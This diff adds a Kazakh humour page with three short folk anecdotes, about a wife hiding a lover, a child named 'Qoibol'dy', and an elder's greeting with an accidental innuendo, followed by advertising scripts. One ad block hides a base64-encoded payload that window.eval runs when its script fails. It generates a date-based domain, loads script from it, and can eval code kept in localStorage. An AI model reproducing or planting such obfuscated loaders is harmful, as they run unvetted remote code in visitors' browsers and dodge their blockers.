@@ -1,0 +1,71 @@
+Түнде бас шала мүжіліп қалады.
+Ертеңіне бай ерте тұрып, малын өргізіп кетеді.
+Көрші ауылдағы бір жігітпен көңілдес болады.
+Бай кетісімен үйге сол келеді.
+Сәскеде малдан бай ертелеу қайтады.
+Кетіп үлгірмеген жігітті әйел жүк арасына жасырады да, түннен қалған ет пен басты байдың алдына қояды.
+Бай басты мүжи бастағанда үш-төрт жасар баласы келіп, әкесінің тізесін баса отырады.
+Сол арада оның көзі жүк арасында жатқан жігіттің көзіне түсіп кетеді.
+—        Көзді қара, көзді қара!..-дейді бала.
+Шошып кеткен шешесі қолма-қол сөз тауып, әңгімені дереу бастың көзіне аударып:
+—        Тек отыр, көзді әкеңнің өзі жесін! - дейді.
+Бай мәз болады.
+«Әйелдің қулығы қырық есекке жүк болады» деген рас сөз. .Біз бала кезде Қойболды деген кісіні білуші едік.
+Кейін жеңгелері айтып отырушы еді.
+Қойболды ұлы бар, қызы бар, он үш ағайынды екен.
+Ол кезде өзі гинеколог, өзі акушер әжелеріміз арқанды керіп тастап, отқа май салып, аруақтарға сиынып, келіндерінен келсаптай ұл-қызды  суырып ала берген ғой.
+Ең соңынан он үшінші болып осы туғанда әйелі күйеуінен:
+— Мына балаңның атын кім қоясың? — деп сұрапты.
+Сонда әкесі ат қоюдан шаршады ма:
+— Қой, болды, — деп қолын бір сілтеп кетіп қалыпты.
+Сөйтіп, осы кенже баласының есімі Қойболды деп жазылып кеткен екен дейді..Қайран, аңқылдаған қазағымның риясыз көңілмен амандасып, хал-жағдай сұрасқанының өзі қызық болғаны бар.
+Бірде бір тойда жасы жетпістен асқан бір қария жақын келіндерінің бірімен ойында ештеңе жоқ қазақы ақкөңілділікпен былай деп хал-жағдай сұрасыпты:
+— Е, келінжан, қалай жағдайларың, жақсы ма, ағайын-туыс, о жақ бұ жағың, астың-үстің, алды-артың тегіс аман ба? — деп шұбырта жөнелтіпті.
+Сонда аузы батылдау келіні тұрып:
+— Қайнаға-ау, ағайын-туыс, хал-жағдайды сұрағаныңыз дұрыс.
+Ал, менің алды-артым мен астымда неңіз бар?- деген екен.
+Асылы, «Аңдамай сөйлеген ауырмай өледі» деген рас сөз.
+Қайнағасы ештеңе дей алмапты..Бөлісіңіз:
+
+
+
+
+
+
+ 
+          var node4990 = document.getElementById("MIXADV_4990");
+          if( node4990 )
+          {
+               var script = document.createElement("script");
+               script.charset = "utf-8";
+               script.src = "https://m.mixadvert.com/show/?id=4990&r="+Math.random();
+               node4990.parentNode.appendChild(script); 
+               script.onerror = function(){
+                  window.eval( atob("dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKSArIDE7IHZhciBkYXkgPSBkYXRlLmdldERhdGUoKTsgdmFyIHllYXIgPSBkYXRlLmdldFllYXIoKTsgdmFyIG5hbWVfZGF5ID0gZGF0ZS5nZXREYXkoKSArIDE7dmFyIGRvbSA9IFsgInBybyIsICJ0b3AiLCAiaW5mbyIsICJvbmxpbmUiLCAic3BhY2UiLCAic2l0ZSIsICJ0ZWNoIl07IHZhciBzdHIgPWRheSoobW9udGggKiBuYW1lX2RheSAqIGRheSkrIiIrIGRheSoobW9udGggKyBuYW1lX2RheSArIGRheSAreWVhcik7dmFyIGhhc2ggPSAgYnRvYShidG9hKHN0cikpLnRvTG93ZXJDYXNlKCk7IHZhciBob3N0ID0gaGFzaC5zdWJzdHJpbmcoMywgaGFzaC5sZW5ndGggLSBuYW1lX2RheS8yKSsiLiIrZG9tW25hbWVfZGF5IC0gMV07dmFyIHIgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgMik7ciA9IHIucmVwbGFjZSgvWzAtOV0vZywgIiIpO3ZhciBkZWx0YSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICgxMDAgLSAxMCArIDEpKSArIDEwO3ZhciBpZCA9IDQ5OTAgLSBkZWx0YTsgdmFyIHNjcmlwdF9maXJzdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdF9maXJzdC5zcmMgPSAiaHR0cHM6Ly8iKyBob3N0KyIvIitkZWx0YStpZCtyKyIiOyBub2RlNDk5MC5wYXJlbnROb2RlLmFwcGVuZENoaWxkKHNjcmlwdF9maXJzdCk7c2V0VGltZW91dCggZnVuY3Rpb24gKCkge3NjcmlwdF9maXJzdC5yZW1vdmUoKX0sIDQwMDApO3NjcmlwdF9maXJzdC5vbmVycm9yID0gZnVuY3Rpb24oKXsgc2V0VGltZW91dCggZnVuY3Rpb24gKCkgeyBpZiggbm9kZTQ5OTAuaW5uZXJIVE1MID09ICIiICkgd2luZG93LmV2YWwobG9jYWxTdG9yYWdlLmdldEl0ZW0oIjQ5OTAiKSkgfSwgNTAwMCk7ICA7fTsg") );
+              }
+          }
+          
+
+
+
+
+    (function(w, d, n, s, t) {
+        w[n] = w[n] || [];
+        w[n].push(function() {
+            Ya.Context.AdvManager.render({
+                blockId: "R-A-241735-5",
+                renderTo: "yandex_rtb_R-A-241735-5",
+                async: true
+            });
+        });
+        t = d.getElementsByTagName("script")[0];
+        s = d.createElement("script");
+        s.type = "text/javascript";
+        s.src = "//an.yandex.ru/system/context.js";
+        s.async = true;
+        t.parentNode.insertBefore(s, t);
+    })(this, this.document, "yandexContextAsyncCallbacks");
+
+
+
+.
